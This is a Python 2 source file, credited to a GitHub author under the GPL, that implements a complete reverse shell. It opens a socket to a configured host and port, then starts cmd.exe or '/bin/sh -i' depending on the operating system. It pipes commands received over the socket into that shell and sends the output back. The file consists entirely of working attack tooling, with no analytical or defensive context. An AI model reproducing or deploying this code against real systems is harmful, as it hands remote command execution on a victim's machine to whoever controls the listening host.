#!/usr/bin/env python
#
# Python Reverse Shell - Shell
# from https://github.com/MisterDaneel/
#
# Copyright (C) {2016}  {MisterDaneel}
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License along
# with this program; if not, write to the Free Software Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
#
from os import name
import socket
import subprocess
from threading import Thread
from Queue import Queue, Empty

timeOut = .5
host = '127.0.0.1'
port = 8080

def FromStreamToQueue(stream, queue):
    while True:
        line = stream.readline()
        if line:
            queue.put(line[:-1] if line[-1:] == '\n' else line)
        else:
            break

class StreamCollector:
    def __init__(self, stream):
        self.queue = Queue()
        self.thread = Thread(target = FromStreamToQueue, args = (stream, self.queue))
        self.thread.daemon = True
        self.thread.start()
    def GetOutput(self):
        try:
            return self.queue.get(block = timeOut is not 0, timeout = timeOut)
        except Empty:
            return None
    def IsAlive(self):
        return self.thread.isAlive()

def StdOutRead(strmCol):
    output = strmCol[0].GetOutput()
    if not output:
        output = strmCol[1].GetOutput()
        if not output: return ''
    return output

def RecCmds(s):
    if 'nt' == name:
        cmd = subprocess.Popen(['cmd.exe'], shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    elif 'posix' == name:
        cmd = subprocess.Popen(['/bin/sh','-i'], shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    else:
        print 'os.name:', name
        if s: s.send(name); s.close()
        return
    strmCol = (StreamCollector(cmd.stdout), StreamCollector(cmd.stderr))
    while True:
        stdOut = StdOutRead(strmCol);
        if stdOut: print stdOut
        else: break
    while strmCol[0].IsAlive() and strmCol[1].IsAlive() and s:
        stdIn = s.recv(1024)
        if len(stdIn) > 0:
            cmd.stdin.write(stdIn)
            toSend = ''
            while True:
                stdOut = StdOutRead(strmCol);
                if stdOut:
                    toSend += '\n'+stdOut
                else: break
            if toSend: s.send(toSend)
    if s: s.close()

def NewSocket():
    try:
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error: " + str(msg))
        return None
    try:
        s.connect((host, port))
        return s
    except socket.error as msg:
        print("Socket connection error: " + str(msg))
        return None

RecCmds(NewSocket())
